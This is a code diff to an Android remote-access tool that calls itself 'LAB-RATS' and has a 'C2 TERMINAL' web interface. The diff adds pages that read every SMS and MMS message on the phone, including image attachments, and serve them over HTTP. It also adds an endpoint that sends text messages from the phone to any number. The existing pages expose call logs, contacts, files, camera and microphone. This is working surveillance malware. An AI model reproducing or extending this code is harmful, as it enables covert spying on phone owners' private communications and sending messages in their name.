@@ -8,12 +8,22 @@ import android.os.Environment;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.Manifest;
+import android.net.Uri;
+import android.telephony.SmsManager;
+import java.io.BufferedReader;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.HashSet;
+import java.util.Set;
+import java.util.HashMap;
+import java.util.Date;
 
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.Locale;
 import java.util.Map;
 
@@ -28,7 +38,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
-            "<title>Lab-RATS | C2 TERMINAL</title>" +
+            "<title>LAB-RATS | C2 TERMINAL</title>" +
             "<link href=\"https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700&display=swap\" rel=\"stylesheet\">" +
             "<style>" +
             ":root {" +
@@ -40,7 +50,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "  --terminal-green: #00ff41;" +
             "  --danger: #ff3131;" +
             "}" +
-            "* { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }" +
+            "* { margin: 0; padding: 0; box-sizing: border-box; cursor: url(\"data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='32' height='32' style='font-size: 24px;'><text y='20'>🐀</text></svg>\"), auto; }" +
             "body {" +
             "  font-family: 'JetBrains Mono', monospace;" +
             "  background: var(--bg-dark);" +
@@ -70,8 +80,8 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "  border-bottom: 1px solid var(--neon-cyan);" +
             "  margin-bottom: 30px;" +
             "  box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);" +
-            "  background: rgba(0, 242, 255, 0.02);" +
-            "  clip-path: polygon(0 0, 100% 0, 100% 80%, 95% 100%, 0 100%);" +
+            "  position: relative;" +
+            "  overflow: hidden;" +
             "}" +
             ".header h1 {" +
             "  font-family: 'Orbitron', sans-serif;" +
@@ -79,6 +89,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "  color: var(--neon-cyan);" +
             "  text-transform: uppercase;" +
             "  letter-spacing: 8px;" +
+            "  margin-right: -8px;" +
             "  text-shadow: 0 0 10px var(--neon-cyan), 0 0 20px var(--neon-cyan);" +
             "  margin-bottom: 10px;" +
             "  animation: glitch 1s infinite alternate;" +
@@ -141,35 +152,36 @@ public class K4N3COHttpServer extends NanoHTTPD {
             ".info-label { color: var(--neon-cyan); opacity: 0.7; font-size: 0.7rem; text-transform: uppercase; }" +
             ".info-value { color: var(--neon-green); font-family: 'JetBrains Mono', monospace; }" +
             "button, .btn {" +
+            "  display: inline-block;" +
             "  background: transparent;" +
             "  border: 1px solid var(--neon-green);" +
             "  color: var(--neon-green);" +
             "  padding: 10px 20px;" +
             "  text-transform: uppercase;" +
             "  letter-spacing: 2px;" +
+            "  text-decoration: none;" +
             "  transition: all 0.3s;" +
             "  box-shadow: inset 0 0 0 0 var(--neon-green);" +
             "}" +
             "button:hover, .btn:hover { background: var(--neon-green); color: var(--bg-dark); box-shadow: 0 0 20px var(--neon-green); }" +
             ".btn-small { padding: 6px 12px; font-size: 0.7rem; min-width: 80px; text-align: center; white-space: nowrap; }" +
-            ".empty-state .icon { color: var(--danger); text-shadow: 0 0 10px var(--danger); }" +
+            ".empty-state { text-align: center; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: center; }" +
+            ".empty-state .icon { color: var(--danger); text-shadow: 0 0 10px var(--danger); font-size: 3rem; margin-bottom: 20px; }" +
+            ".empty-state h2 { margin-bottom: 10px; }" +
+            ".empty-state p { opacity: 0.7; margin-bottom: 25px; }" +
             ".glitch-text {" +
             "  color: var(--neon-cyan);" +
             "  font-size: 0.6rem;" +
             "  letter-spacing: 3px;" +
+            "  margin-right: -3px;" +
             "  text-transform: uppercase;" +
             "  margin-top: 5px;" +
             "  position: relative;" +
-            "  animation: static-glitch 12s infinite;" +
+            "  animation: subtle-glow 4s ease-in-out infinite;" +
             "}" +
-            "@keyframes static-glitch {" +
-            "  0%, 10%, 100% { transform: translate(0) scale(1); color: var(--neon-cyan); opacity: 1; }" +
-            "  1% { transform: translate(-3px) scaleX(1.1); color: #fff; opacity: 0.8; }" +
-            "  2% { transform: translate(3px) scaleX(0.9); color: var(--neon-cyan); }" +
-            "  3% { transform: translate(-1px) scaleX(1.05); color: #fff; }" +
-            "  4% { transform: translate(0) scale(1); color: var(--neon-cyan); }" +
-            "  5% { transform: translate(2px) scaleX(1.1); color: #fff; }" +
-            "  6% { transform: translate(0) scale(1); color: var(--neon-cyan); }" +
+            "@keyframes subtle-glow {" +
+            "  0%, 100% { opacity: 0.6; text-shadow: 0 0 2px var(--neon-cyan); }" +
+            "  50% { opacity: 1; text-shadow: 0 0 8px var(--neon-cyan); }" +
             "}" +
             "@media (max-width: 768px) {" +
             "  .header h1 { font-size: 1.8rem; letter-spacing: 4px; }" +
@@ -206,13 +218,27 @@ public class K4N3COHttpServer extends NanoHTTPD {
             ".file-icon-video { background: rgba(231, 76, 60, 0.2); border: 1px solid #e74c3c; color: #e74c3c; }" +
             ".file-icon-audio { background: rgba(26, 188, 156, 0.2); border: 1px solid #1abc9c; color: #1abc9c; }" +
             ".file-icon-doc { background: rgba(46, 204, 113, 0.2); border: 1px solid #2ecc71; color: #2ecc71; }" +
+            ".watermark {" +
+            "  position: absolute;" +
+            "  top: 2px;" +
+            "  left: 20px;" +
+            "  width: 242px;" +
+            "  height: 182px;" +
+            "  background: url('/logo') no-repeat left center;" +
+            "  background-size: contain;" +
+            "  opacity: 0.10;" +
+            "  z-index: -1;" +
+            "  pointer-events: none;" +
+            "  filter: grayscale(100%) brightness(200%);" +
+            "}" +
             "</style>" +
             "</head>" +
             "<body>" +
             "<div class=\"container\">" +
             "<div class=\"header\">" +
-            "<h1>Lab-RATS</h1>" +
-            "<p style=\"color: var(--neon-cyan); font-size: 0.7rem; opacity: 0.6; letter-spacing: 5px;\">REMOTE ACCESS TERMINAL v4.0.26</p>" +
+            "<div class=\"watermark\"></div>" +
+            "<h1>LAB-RATS</h1>" +
+            "<p style=\"color: var(--neon-cyan); font-size: 0.7rem; opacity: 0.6; letter-spacing: 5px; margin-right: -5px;\">REMOTE ACCESS TERMINAL V2.0.1</p>" +
             "<div class=\"glitch-text\">Developed by K4N3CO.LABS</div>" +
             "</div>" +
             "<div class=\"nav\">" +
@@ -222,6 +248,8 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<a href=\"/audio\">Acoustics</a>" +
             "<a href=\"/files\">Data</a>" +
             "<a href=\"/calls\">Comms</a>" +
+            "<a href=\"/sms\">SMS</a>" +
+            "<a href=\"/mms\">MMS</a>" +
             "<a href=\"/contacts\">Contacts</a>" +
             "</div>";
 
@@ -250,6 +278,14 @@ public class K4N3COHttpServer extends NanoHTTPD {
                 return serveFiles(uri, params);
             } else if (uri.equals("/calls")) {
                 return serveCallLogs(params);
+            } else if (uri.equals("/sms")) {
+                return serveSmsMessages(params);
+            } else if (uri.equals("/mms")) {
+                return serveMmsMessages(params);
+            } else if (uri.startsWith("/mms/image/")) {
+                return serveMmsImage(uri.substring(11));
+            } else if (uri.equals("/sms/send")) {
+                return sendSms(params);
             } else if (uri.equals("/contacts")) {
                 return serveContacts(params);
             } else if (uri.equals("/camera")) {
@@ -357,7 +393,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
         String[][] nodes = {
             {"/device", "Hardware", "&#128241;", "var(--neon-cyan)"},
             {"/files", "Data", "&#128193;", "var(--neon-green)"},
-            {"/calls", "Comms", "&#128222;", "var(--neon-magenta)"},
+            {"/calls", "Comms", "&#128222;", "#ffff00"},
             {"/contacts", "Contacts", "&#128101;", "#f39c12"},
             {"/camera", "Optics", "&#128247;", "var(--danger)"},
             {"/audio", "Acoustics", "&#127908;", "#1abc9c"}
@@ -477,7 +513,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                     if (i > 0) ext = fileName.substring(i+1).toUpperCase();
                     html.append("<span style=\"color: var(--neon-cyan);\">").append(ext.isEmpty() ? "FILE" : ext).append("</span> &nbsp;|&nbsp; ");
                     html.append(formatFileSize(file.length())).append(" &nbsp;|&nbsp; ");
-                    html.append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
+                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(file.lastModified())));
                 }
                 html.append("</div></div>");
 
@@ -665,8 +701,11 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
                 // Pagination links
                 if (totalPages > 1) {
-                    html.append("<div class=\"pagination\">");
+                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
+
+                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                     if (page > 1) {
+                        html.append("<a href=\"/calls?page=1\">First</a>");
                         html.append("<a href=\"/calls?page=").append(page - 1).append("\">&#8592; Prev</a>");
                     }
 
@@ -674,17 +713,23 @@ public class K4N3COHttpServer extends NanoHTTPD {
                     int endPage = Math.min(totalPages, page + 2);
 
                     for (int i = startPage; i <= endPage; i++) {
-                        if (i == page) {
-                            html.append("<a class=\"active\" href=\"/calls?page=").append(i).append("\">").append(i)
-                                    .append("</a>");
-                        } else {
-                            html.append("<a href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
-                        }
+                        String active = (i == page) ? "class=\"active\"" : "";
+                        html.append("<a ").append(active).append(" href=\"/calls?page=").append(i).append("\">").append(i).append("</a>");
                     }
 
                     if (page < totalPages) {
                         html.append("<a href=\"/calls?page=").append(page + 1).append("\">Next &#8594;</a>");
+                        html.append("<a href=\"/calls?page=").append(totalPages).append("\">Last</a>");
                     }
+                    html.append("</div>");
+
+                    // Jump to page box
+                    html.append("<form action=\"/calls\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
+                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
+                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
+                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
+                    html.append("</form>");
+
                     html.append("</div>");
                 }
             } else {
@@ -804,8 +849,11 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
                 // Pagination links
                 if (totalPages > 1) {
-                    html.append("<div class=\"pagination\">");
+                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
+
+                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                     if (page > 1) {
+                        html.append("<a href=\"/contacts?page=1\">First</a>");
                         html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                     }
 
@@ -813,17 +861,23 @@ public class K4N3COHttpServer extends NanoHTTPD {
                     int endPage = Math.min(totalPages, page + 2);
 
                     for (int i = startPage; i <= endPage; i++) {
-                        if (i == page) {
-                            html.append("<a class=\"active\" href=\"/contacts?page=").append(i).append("\">").append(i)
-                                    .append("</a>");
-                        } else {
-                            html.append("<a href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
-                        }
+                        String active = (i == page) ? "class=\"active\"" : "";
+                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                     }
 
                     if (page < totalPages) {
                         html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
+                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                     }
+                    html.append("</div>");
+
+                    // Jump to page box
+                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
+                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
+                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
+                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
+                    html.append("</form>");
+
                     html.append("</div>");
                 }
             } else {
@@ -1997,5 +2051,330 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html.append(HTML_FOOTER);
 
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveSmsMessages(Map<String, String> params) {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
+        html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
+        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128231; Send New Message</h3>");
+        html.append("<form action=\"/sms/send\" method=\"get\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
+        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 4px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
+        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">ENCRYPT & SEND</button>");
+        html.append("</div></form></div>");
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>SMS permission not granted.</p></div></div>").append(HTML_FOOTER);
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+            }
+        }
+        int page = 1; int limit = 50;
+        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
+        int offset = (page - 1) * limit;
+        Cursor cursor = null;
+        try {
+            Uri smsUri = Uri.parse("content://sms/");
+            cursor = context.getContentResolver().query(smsUri, new String[]{"_id", "address", "body", "date", "type"}, null, null, "date DESC");
+            if (cursor != null && cursor.getCount() > 0) {
+                int totalCount = cursor.getCount();
+                int totalPages = (int) Math.ceil((double) totalCount / limit);
+                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
+                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Address</th><th>Message</th><th>Date</th></tr></thead><tbody>");
+                int count = 0, skipped = 0;
+                Map<String, String> contactCache = new HashMap<>();
+                while (cursor.moveToNext()) {
+                    if (skipped < offset) { skipped++; continue; }
+                    if (count >= limit) break;
+                    String address = cursor.getString(1), body = cursor.getString(2);
+                    long date = cursor.getLong(3); int type = cursor.getInt(4);
+                    String typeLabel = (type == 1) ? "INBOX" : "SENT", typeClass = (type == 1) ? "call-incoming" : "call-outgoing";
+                    String displayName = getContactName(address, contactCache);
+                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
+                    html.append("<td>").append(escapeHtml(displayName)).append("</td>");
+                    html.append("<td style=\"max-width: 400px; word-wrap: break-word;\">").append(body != null ? escapeHtml(body) : "").append("</td>");
+                    html.append("<td>").append(formatMessageDate(date)).append("</td></tr>");
+                    count++;
+                }
+                html.append("</tbody></table></div>");
+                if (totalPages > 1) {
+                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
+                    
+                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
+                    if (page > 1) {
+                        html.append("<a href=\"/sms?page=1\">First</a>");
+                        html.append("<a href=\"/sms?page=").append(page - 1).append("\">&#8592; Prev</a>");
+                    }
+
+                    int startPage = Math.max(1, page - 2);
+                    int endPage = Math.min(totalPages, page + 2);
+                    for (int i = startPage; i <= endPage; i++) {
+                        String active = (i == page) ? "class=\"active\"" : "";
+                        html.append("<a ").append(active).append(" href=\"/sms?page=").append(i).append("\">").append(i).append("</a>");
+                    }
+
+                    if (page < totalPages) {
+                        html.append("<a href=\"/sms?page=").append(page + 1).append("\">Next &#8594;</a>");
+                        html.append("<a href=\"/sms?page=").append(totalPages).append("\">Last</a>");
+                    }
+                    html.append("</div>");
+
+                    // Jump to page box
+                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
+                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
+                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
+                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
+                    html.append("</form>");
+
+                    html.append("</div>");
+                }
+            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
+        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
+        finally { if (cursor != null) cursor.close(); }
+        html.append("</div>").append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveMmsMessages(Map<String, String> params) {
+        StringBuilder html = new StringBuilder(HTML_HEADER);
+        html.append("<div class=\"card\">");
+        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+            }
+        }
+        int page = 1; int limit = 20;
+        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
+        int offset = (page - 1) * limit;
+        Cursor cursor = null;
+        try {
+            Set<String> mmsWithImages = getMmsIdsWithImages();
+            Uri mmsUri = Uri.parse("content://mms/");
+            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
+            if (cursor != null && cursor.getCount() > 0) {
+                List<String[]> mmsList = new ArrayList<>();
+                while (cursor.moveToNext()) {
+                    String mmsId = cursor.getString(0);
+                    if (mmsWithImages.contains(mmsId)) {
+                        mmsList.add(new String[]{
+                            mmsId, 
+                            String.valueOf(cursor.getLong(1) * 1000), 
+                            String.valueOf(cursor.getInt(2))
+                        });
+                    }
+                }
+
+                int totalCount = mmsList.size();
+                int totalPages = (int) Math.ceil((double) totalCount / limit);
+                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
+                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
+                
+                Map<String, String> contactCache = new HashMap<>();
+                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
+                    String[] mData = mmsList.get(i);
+                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
+                    int msgBox = Integer.parseInt(mData[2]);
+                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
+                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
+                    String displayName = getContactName(address, contactCache);
+                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
+                    html.append("<td>").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px;\">");
+                    for (String part : parts) {
+                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
+                        else if (part.startsWith("image:")) {
+                            html.append("<img src=\"/mms/image/").append(part.substring(6))
+                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
+                        }
+                    }
+                    html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
+                }
+                html.append("</tbody></table></div>");
+                if (totalPages > 1) {
+                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
+                    
+                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
+                    if (page > 1) {
+                        html.append("<a href=\"/mms?page=1\">First</a>");
+                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
+                    }
+                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
+                        String active = (i == page) ? "class=\"active\"" : "";
+                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
+                    }
+                    if (page < totalPages) {
+                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
+                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
+                    }
+                    html.append("</div>");
+
+                    // Jump to page box
+                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
+                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
+                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
+                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
+                    html.append("</form>");
+
+                    html.append("</div>");
+                }
+            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
+        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
+        finally { if (cursor != null) cursor.close(); }
+        html.append("</div>").append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private String getMmsAddress(String mmsId) {
+        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
+        Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null);
+        String address = "Unknown";
+        if (c != null) {
+            int addrIdx = c.getColumnIndex("address");
+            while (c.moveToNext()) {
+                if (addrIdx != -1) {
+                    String addr = c.getString(addrIdx);
+                    if (addr != null && !addr.equals("insert-address-token")) {
+                        address = addr;
+                        break;
+                    }
+                }
+            }
+            c.close();
+        }
+        return address;
+    }
+
+    private List<String> getMmsParts(String mmsId) {
+        List<String> parts = new ArrayList<>();
+        Uri partUri = Uri.parse("content://mms/part");
+        Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null);
+        if (c != null) {
+            int idIdx = c.getColumnIndex("_id");
+            int ctIdx = c.getColumnIndex("ct");
+            int textIdx = c.getColumnIndex("text");
+            while (c.moveToNext()) {
+                if (idIdx == -1 || ctIdx == -1) continue;
+                String partId = c.getString(idIdx);
+                String type = c.getString(ctIdx);
+                if ("text/plain".equals(type)) {
+                    String body = textIdx != -1 ? c.getString(textIdx) : null;
+                    if (body == null && partId != null) body = getMmsText(partId);
+                    if (body != null) parts.add("text:" + body);
+                } else if (type != null && type.startsWith("image/") && partId != null) {
+                    parts.add("image:" + partId);
+                }
+            }
+            c.close();
+        }
+        return parts;
+    }
+
+    private Set<String> getMmsIdsWithImages() {
+        Set<String> ids = new HashSet<>();
+        try {
+            Uri partUri = Uri.parse("content://mms/part");
+            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%'", null, null);
+            if (c != null) {
+                int midIdx = c.getColumnIndex("mid");
+                while (c.moveToNext()) {
+                    if (midIdx != -1) {
+                        String mid = c.getString(midIdx);
+                        if (mid != null) ids.add(mid);
+                    }
+                }
+                c.close();
+            }
+        } catch (Exception e) {}
+        return ids;
+    }
+
+    private String getContactName(String number, Map<String, String> cache) {
+        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
+            return number == null ? "Unknown" : number;
+        }
+
+        if (cache != null && cache.containsKey(number)) {
+            return cache.get(number);
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+                return number;
+            }
+        }
+
+        String result = number;
+        Cursor cursor = null;
+        try {
+            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
+            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+            if (cursor != null && cursor.moveToFirst()) {
+                String name = cursor.getString(0);
+                if (name != null && !name.isEmpty()) {
+                    result = name;
+                }
+            }
+        } catch (Exception e) {
+        } finally {
+            if (cursor != null) cursor.close();
+        }
+
+        if (cache != null) {
+            cache.put(number, result);
+        }
+        return result;
+    }
+
+    private String formatMessageDate(long timestamp) {
+        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(timestamp));
+    }
+
+    private String getMmsText(String partId) {
+        Uri partUri = Uri.parse("content://mms/part/" + partId);
+        StringBuilder sb = new StringBuilder();
+        try {
+            InputStream is = context.getContentResolver().openInputStream(partUri);
+            if (is != null) {
+                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                is.close();
+            }
+        } catch (Exception e) {}
+        return sb.toString();
+    }
+
+    private Response serveMmsImage(String partId) {
+        try {
+            Uri uri = Uri.parse("content://mms/part/" + partId);
+            InputStream is = context.getContentResolver().openInputStream(uri);
+            if (is == null) return serve404();
+            String mimeType = "image/jpeg";
+            Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null);
+            if (c != null) {
+                if (c.moveToFirst()) mimeType = c.getString(0);
+                c.close();
+            }
+            return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
+        } catch (Exception e) { return serveError("Failed to load image: " + e.getMessage()); }
+    }
+
+    private Response sendSms(Map<String, String> params) {
+        String number = params.get("number"), message = params.get("message");
+        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
+            }
+            SmsManager smsManager;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(SmsManager.class);
+            else smsManager = SmsManager.getDefault();
+            smsManager.sendTextMessage(number, null, message, null, null);
+            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
+            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+        } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
     }
 }
